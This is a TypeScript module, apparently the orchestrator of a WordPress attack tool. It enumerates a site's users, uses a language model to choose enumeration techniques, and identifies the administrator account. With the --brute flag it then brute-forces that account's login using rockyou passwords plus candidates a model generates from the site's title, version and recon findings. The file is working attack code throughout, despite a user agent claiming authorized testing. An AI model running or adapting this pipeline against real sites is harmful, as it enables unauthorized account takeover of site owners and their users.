import { HttpClient } from "../http/client.js";
import { runRecon } from "../recon/wpScan.js";
import { bruteForceLogin } from "../bruteforce/login.js";
import { TECHNIQUES, getTechnique } from "../techniques/index.js";
import { loadRockyouTop } from "../bruteforce/wordlist.js";
import { buildModel } from "./providers.js";
import { buildPlan } from "./planner.js";
import { buildPasswordList } from "./bruteStrategy.js";
import { buildSummary } from "./summary.js";
import type { LanguageModelV1 } from "ai";
import type { ReconResult } from "../types.js";
import type { AppConfig } from "../config.js";
import type { BruteForceResult, DiscoveredUser, ScanReport } from "../types.js";

export async function runScan(config: AppConfig): Promise<ScanReport> {
  const http = new HttpClient({
    timeoutMs: config.timeoutMs,
    retries: config.retries,
    userAgent: "wp-user-enum/1.0 (+authorized-security-testing)",
  });
  const startedAt = new Date().toISOString();

  const recon = await runRecon(http, config.target);
  const model = buildModel(config.ai);
  const plan = await buildPlan(model, recon, TECHNIQUES);

  const discovered = new Map<string, DiscoveredUser>();
  const techniquesUsed: string[] = [];
  for (const id of plan.techniques) {
    const technique = getTechnique(id);
    if (!technique) continue;
    const result = await technique.run({
      http,
      target: config.target,
      recon,
      authorIdRange: config.authorIdRange,
    });
    techniquesUsed.push(id);
    for (const user of result.users) mergeUser(discovered, user);
  }
  const users = [...discovered.values()];

  const bruteForce = await maybeBruteForce(http, config, model, recon, users);
  const summary = await buildSummary(model, { recon, plan, users, bruteForce });
  const finishedAt = new Date().toISOString();

  return {
    target: config.target,
    startedAt,
    finishedAt,
    recon,
    plan,
    techniquesUsed,
    users,
    bruteForce,
    summarySource: summary.source,
    aiProvider: config.ai.provider !== "none" ? config.ai.provider : undefined,
    aiSummary: summary.text,
  };
}

function mergeUser(map: Map<string, DiscoveredUser>, user: DiscoveredUser): void {
  const key = user.username.toLowerCase();
  const existing = map.get(key);
  if (!existing) {
    map.set(key, { ...user, sources: [...user.sources] });
    return;
  }
  existing.sources = [...new Set([...existing.sources, ...user.sources])];
  if (existing.id === undefined && user.id !== undefined) existing.id = user.id;
  if (!existing.displayName && user.displayName) existing.displayName = user.displayName;
}

async function maybeBruteForce(
  http: HttpClient,
  config: AppConfig,
  model: LanguageModelV1 | null,
  recon: ReconResult,
  users: DiscoveredUser[],
): Promise<BruteForceResult> {
  if (!config.bruteForce) {
    return { attempted: false, triedCount: 0, detail: "Brute-force not run (pass --brute to enable)." };
  }
  const admin = pickAdmin(users);
  if (!admin) {
    return { attempted: false, triedCount: 0, detail: "Brute-force skipped: no admin username discovered." };
  }

  if (config.passwordFile) {
    const fromFile = await loadPasswords(config.passwordFile);
    const result = await bruteForceLogin(http, config.target, admin.username, {
      passwords: fromFile,
      maxAttempts: config.maxAttempts,
    });
    result.detail = `[custom wordlist ${config.passwordFile}] ${result.detail}`;
    return result;
  }

  const rockyou = await loadRockyouTop(300);
  const { passwords, source } = await buildPasswordList(
    model,
    {
      username: admin.username,
      siteTitle: recon.siteTitle,
      wpVersion: recon.wpVersion,
      findings: recon.findings,
    },
    rockyou,
    config.maxAttempts,
  );
  const result = await bruteForceLogin(http, config.target, admin.username, {
    passwords,
    maxAttempts: config.maxAttempts,
  });
  const pool = rockyou.length ? "rockyou + contextual" : "contextual (rockyou unavailable)";
  result.detail = `[${source} strategy, ${passwords.length} candidates from ${pool}] ${result.detail}`;
  return result;
}

function pickAdmin(users: DiscoveredUser[]): DiscoveredUser | undefined {
  return (
    users.find((u) => u.id === 1) ??
    users.find((u) => /^admin/i.test(u.username)) ??
    users[0]
  );
}

async function loadPasswords(file?: string): Promise<string[] | undefined> {
  if (!file) return undefined;
  try {
    const { readFile } = await import("node:fs/promises");
    const content = await readFile(file, "utf8");
    return content.split(/\r?\n/).map((l) => l.trim()).filter(Boolean);
  } catch {
    return undefined;
  }
}
